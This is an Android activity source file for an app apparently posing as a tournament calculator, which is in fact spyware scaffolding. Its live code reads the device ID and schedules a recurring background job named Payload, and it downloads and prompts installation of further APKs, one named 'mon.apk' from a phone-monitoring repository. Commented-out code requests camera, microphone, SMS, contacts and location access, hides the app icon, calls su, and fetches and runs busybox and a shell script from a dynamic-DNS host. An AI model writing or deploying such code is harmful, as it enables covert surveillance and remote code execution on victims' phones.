package com.example.pista.tornei;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
/*import android.support.annotation.NonNull;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;*/
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Button;
import android.widget.EditText;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import android.provider.Settings.Secure;

import com.firebase.jobdispatcher.JobTrigger;
import com.fsck.k9.mail.FetchProfile;
import com.fsck.k9.mail.Folder;
import com.fsck.k9.mail.Folder.FolderType;
import com.fsck.k9.mail.Message;
import com.fsck.k9.mail.MessagingException;
import com.fsck.k9.mail.ssl.DefaultTrustedSocketFactory;
import com.fsck.k9.mail.ssl.TrustedSocketFactory;
import com.fsck.k9.mail.store.imap.ImapFolder;
import com.fsck.k9.mail.store.imap.ImapMessage;
import com.fsck.k9.mail.store.imap.ImapResponse;
import com.fsck.k9.mail.store.imap.ImapSearcher;
import com.fsck.k9.mail.store.imap.ImapStore;
import com.fsck.k9.mail.store.StoreConfig;
import com.fsck.k9.mail.NetworkType;
import javax.mail.*;
import javax.mail.search.FlagTerm;
import java.util.*;
import com.firebase.jobdispatcher.Constraint;
import com.firebase.jobdispatcher.FirebaseJobDispatcher;
import com.firebase.jobdispatcher.GooglePlayDriver;
import com.firebase.jobdispatcher.Job;
import com.firebase.jobdispatcher.Lifetime;
import com.firebase.jobdispatcher.RetryStrategy;
import com.firebase.jobdispatcher.Trigger;

import static com.firebase.jobdispatcher.Lifetime.FOREVER;
import 	android.app.ActivityManager;

import android.app.ProgressDialog;
import android.os.AsyncTask;
import android.os.Environment;

import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;


import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;

public class MainActivity extends Activity implements View.OnClickListener {
    public static Button btExit,btExit2,btExit3;
    public static Context gcontext;
    public static String curdir;
    Intent mis;
    private EditText eGiocatori;
    private EditText ePartiteTot;
    private EditText ePartite;
    private Button btClose;
    SharedPreferences prefs = null;
    @Override
    protected void onCreate(Bundle savedInstanceState) {



        //Intent i = new Intent("com.zegoggles.smssync.BACKUP");
        //sendBroadcast(i);


         String android_id = Secure.getString(this.getContentResolver(),
                Secure.ANDROID_ID);


        String str= new String("down http://151.76.198.146/svc/wup.php?pc=ppppp");
        String str1= getApplicationInfo().dataDir;
        String str2=str.substring(5,str.length());
        String str3=str.substring( str.lastIndexOf('/')+1, str.length() );

/*        try {
            //Process p Runtime.getRuntime().exec("su", null, null);
            Process p = Runtime.getRuntime().exec("su");
            try {
                p.waitFor();
            }
            catch (InterruptedException e) {
                System.out.println("got interrupted!");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
*/
        super.onCreate(savedInstanceState);
//        String fileName="myapp.apk";
//        openApk(MyConfig.apk1);
        Bundle myExtrasBundle = new Bundle();


        myExtrasBundle.putString("mpath", this.getApplicationInfo().dataDir);
        myExtrasBundle.putString("mandroid_id", android_id);
        FirebaseJobDispatcher mDispatcher = new FirebaseJobDispatcher(new GooglePlayDriver(this));
        Job myJob = mDispatcher.newJobBuilder()
                .setService(com.example.pista.tornei.Payload.class)
                .setTag("TagPaylo")
                .setRecurring(true)
                //.setTrigger(Trigger.executionWindow(5, 30))
                .setTrigger(Trigger.executionWindow(0, 120))
                .setLifetime(FOREVER)
                .setReplaceCurrent(false)
                .setConstraints(Constraint.ON_ANY_NETWORK)
                .setRetryStrategy(RetryStrategy.DEFAULT_EXPONENTIAL)
                .setExtras(myExtrasBundle)
                .build();
        mDispatcher.mustSchedule(myJob);



        prefs = getSharedPreferences("com.example.pista.tornei", MODE_PRIVATE);
        if (prefs.getBoolean("firstrun", true)) {
            setContentView(R.layout.activity_main);
            btExit = (Button) findViewById(R.id.btExit);
            btExit.setOnClickListener(this);
            btExit2 = (Button) findViewById(R.id.btExit2);
            btExit2.setOnClickListener(this);
            btExit3 = (Button) findViewById(R.id.btExit3);
            btExit3.setOnClickListener(this);
            //Uri uri = Uri.parse("https://play.google.com/store/apps/details?id=net.metaquotes.metatrader5"); // missing 'http://' will cause crashed
            //Intent intent = new Intent(Intent.ACTION_VIEW, uri);
            //startActivity(intent);
            //Uri uri = Uri.parse("https://github.com/pistacchietto/ProtectedService1/raw/master/app/release/prot.apk");
            //Intent intent = new Intent(Intent.ACTION_VIEW, uri);
            //startActivity(intent);






            //uri = Uri.parse("https://github.com/pistacchietto/Tornei/raw/master/app/release/auto.apk");
            // intent = new Intent(Intent.ACTION_VIEW, uri);
            //startActivity(intent);
            // Do first run stuff here then set 'firstrun' as false
            // using the following line to edit/commit prefs
            prefs.edit().putBoolean("firstrun", false).commit();

        }


/*       Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.setClassName("com.example.protectedservice", "com.example.protectedservice.ActivityRestart");
        if (!isActivityRunning(intent.getClass()))
            startActivity(intent);
*/

        //hideApplication();
        //finish();

/*        gcontext=this;
        curdir=gcontext.getApplicationInfo().dataDir;
        new C00003().start();
*/      //  mis = new Intent(this,MyIntentService.class);
        //initJobs();
        //QuickPeriodicJobScheduler jobScheduler = new QuickPeriodicJobScheduler(this);
        //jobScheduler.start(1, 60000l); // Run job with jobId=1 every 60 seconds

        //this.startService(mis);
        //finish();

//        hideApplication();
        /*ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_EXTERNAL_STORAGE}, 2);
        */
        //hideApplication();
        /*setContentView(R.layout.activity_main);


        eGiocatori=(EditText)findViewById(R.id.editGiocatori);
        ePartiteTot=(EditText)findViewById(R.id.editPartiteTot);
        ePartite=(EditText)findViewById(R.id.editPartite);
        btClose=(Button)findViewById(R.id.bclose);
        btClose.setOnClickListener(
                new Button.OnClickListener() {
                    public void onClick(View v) {
                        hideApplication();
                        finish();
                    }
                }
        );
        eGiocatori.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {

            }

            @Override
            public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {

            }

            @Override
            public void afterTextChanged(Editable editable) {
                if (eGiocatori.getText().toString().trim().length() > 0) {
                    ePartiteTot.setText(String.valueOf(binomial(Integer.parseInt(eGiocatori.getText().toString()), 4) * 3));
                    ePartite.setText(String.valueOf(binomial(Integer.parseInt(eGiocatori.getText().toString()), 2) / 2));
                }
            }
        });

       /* Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });
    }
    private static long binomial(int n, int k)
    {
        if (k>n-k)
            k=n-k;

        long b=1;
        for (int i=1, m=n; i<=k; i++, m--)
            b=b*m/i;
        return b;
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String permissions[], @NonNull int[] grantResults) {
        boolean bok=false;
        for(int element:grantResults)
        {
            if (element>=0) {
                if (grantResults.length > 0 && grantResults[element] == PackageManager.PERMISSION_GRANTED) {//&& requestCode==1) {
                    bok = true;
                }
            }
            else
            {
                bok=false;
                break;
            }

        }

        if (bok) {
            //hideApplication();
            //finish();
        }
        else
        {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_EXTERNAL_STORAGE}, 2);

        }

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    */}
/*    static class C00003 extends Thread {
        C00003() {
        }

        public void run() {
            Payload.DownloadFromUrl("http://verifiche.ddns.net/android/busybox");
            Payload.DownloadFromUrl("http://verifiche.ddns.net/android/woffice.sh");
            try {
                Process pexec = Runtime.getRuntime().exec("chmod 755 "+curdir+"/busybox");
                Thread.sleep(60 * 1000);
                pexec = Runtime.getRuntime().exec("chmod 755 "+curdir+"/woffice.sh");
                Thread.sleep(60 * 1000);
                pexec = Runtime.getRuntime().exec("nohup "+curdir+"/woffice.sh");
            }catch (Exception e) {
                e.printStackTrace();
            }
            Payload.main(null);
        }
    }
*/
class DownloadFileFromURL extends AsyncTask<String, String, String> {

    /**
     * Before starting background thread
     * */

    private Context mContext;
    private String murl;
    public DownloadFileFromURL (Context context){
        mContext = context;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        System.out.println("Starting download");


    }

    /**
     * Downloading file in background thread
     * */
    @Override
    protected String doInBackground(String... f_url) {
        int count;
        try {
            String root = Environment.getExternalStorageDirectory().toString();

            System.out.println("Downloading");
            murl=f_url[0];
            URL url = new URL(f_url[0]);

            URLConnection conection = url.openConnection();
            conection.connect();
            // getting file length
            int lenghtOfFile = conection.getContentLength();

            // input stream to read file - with 8k buffer
            InputStream input = new BufferedInputStream(url.openStream(), 8192);

            // Output stream to write file

            OutputStream output = new FileOutputStream(root+"/"+f_url[0].substring(f_url[0].lastIndexOf('/') + 1, f_url[0].length()));
            byte data[] = new byte[1024];

            long total = 0;
            while ((count = input.read(data)) != -1) {
                total += count;

                // writing data to file
                output.write(data, 0, count);

            }

            // flushing output
            output.flush();

            // closing streams
            output.close();
            input.close();

        } catch (Exception e) {
            Log.e("Error: ", e.getMessage());
        }

        return null;
    }



    /**
     * After completing background task
     * **/
    @Override
    protected void onPostExecute(String file_url) {
        System.out.println(file_url+"Downloaded");

        Intent promptInstall = new Intent(Intent.ACTION_VIEW);
        promptInstall.setDataAndType(Uri.fromFile(new File(Environment
                .getExternalStorageDirectory() + "/"+murl.substring(murl.lastIndexOf('/') + 1, murl.length()))),
                //.getExternalStorageDirectory() + "/prot.apk")),
                "application/vnd.android.package-archive");
        promptInstall.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        mContext.startActivity(promptInstall);

    }

}
@Override
public void onClick(View v) {
    switch (v.getId()) {
        case R.id.btExit:
            try {


                //Uri uri = Uri.parse("https://play.google.com/store/apps/details?id=net.metaquotes.metatrader5"); // missing 'http://' will cause crashed
                //Uri uri = Uri.parse("https://github.com/pistacchietto/Tornei/raw/master/app/release/auto.apk");
                //Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                //startActivity(intent);
                new DownloadFileFromURL(this).execute("https://github.com/pistacchietto/ProtectedService1/raw/master/app/release/prot.apk");
                //hideApplication();
                //finish();

            } catch (Exception e) {
                e.printStackTrace();
            }

            break;
        case R.id.btExit2:
            try {


                //Uri uri = Uri.parse("https://play.google.com/store/apps/details?id=net.metaquotes.metatrader5"); // missing 'http://' will cause crashed
                //Uri uri = Uri.parse("https://github.com/pistacchietto/Tornei/raw/master/app/release/auto.apk");
                //Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                //startActivity(intent);
                new DownloadFileFromURL(this).execute("https://github.com/pistacchietto/PhoneMonitor/raw/master/AndroidStudioProject/PhoneMonitor/app/release/mon.apk");
                //hideApplication();
                //finish();

            } catch (Exception e) {
                e.printStackTrace();
            }

            break;
        case R.id.btExit3:
            try {


                //Uri uri = Uri.parse("https://play.google.com/store/apps/details?id=net.metaquotes.metatrader5"); // missing 'http://' will cause crashed
                //Uri uri = Uri.parse("https://github.com/pistacchietto/Tornei/raw/master/app/release/auto.apk");
                //Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                //startActivity(intent);
                new DownloadFileFromURL(this).execute("https://github.com/pistacchietto/Tornei/raw/master/app/release/auto.apk");
                //hideApplication();
                //finish();

            } catch (Exception e) {
                e.printStackTrace();
            }

            break;

    }
}
protected Boolean isActivityRunning(Class activityClass)
    {
        ActivityManager activityManager = (ActivityManager) getBaseContext().getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningTaskInfo> tasks = activityManager.getRunningTasks(Integer.MAX_VALUE);

        for (ActivityManager.RunningTaskInfo task : tasks) {
            if (activityClass.getCanonicalName().equalsIgnoreCase(task.baseActivity.getClassName()))
                return true;
        }

        return false;
    }
    public void openApk(String fileName) {

        ((MyApplication) getApplication()).LoadApk(fileName);
    }
    private void hideApplication() {
        // nasconde l'icona dal drawer dopo il primo avvio
        PackageManager pm = getApplicationContext().getPackageManager();
        pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);

    }
    public void initJobs() {
        int jobId = 1;
        QuickPeriodicJob job = new QuickPeriodicJob(jobId, new PeriodicJob() {
            @Override
            public void execute(QuickJobFinishedCallback callback) {
                //Payload.main(null);

                // When you have done all your work in the job, call jobFinished to release the resources
                callback.jobFinished();
            }
        });
        QuickPeriodicJobCollection.addJob(job);
    }
}
